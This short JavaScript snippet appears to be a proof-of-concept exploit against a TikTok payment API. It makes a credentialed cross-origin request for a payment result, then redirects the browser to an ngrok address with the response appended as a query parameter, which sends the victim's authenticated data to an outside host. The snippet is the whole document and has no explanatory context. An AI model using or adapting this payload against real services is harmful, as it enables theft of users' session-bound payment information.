var xhr = new XMLHttpRequest();
xhr.onload = reqListener; 
xhr.open("GET", "https://fp.us.tiktokv.com/pipo_fe/checkout/payment_api/payment/v1/get_payment_result?biz_id=ARMAAEoZjpPDfU8EurijAeigjgoL");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send(null);

function reqListener() {
    location='//2d7a-140-213-103-229.ngrok-free.app/?key='+this.responseText; 
};
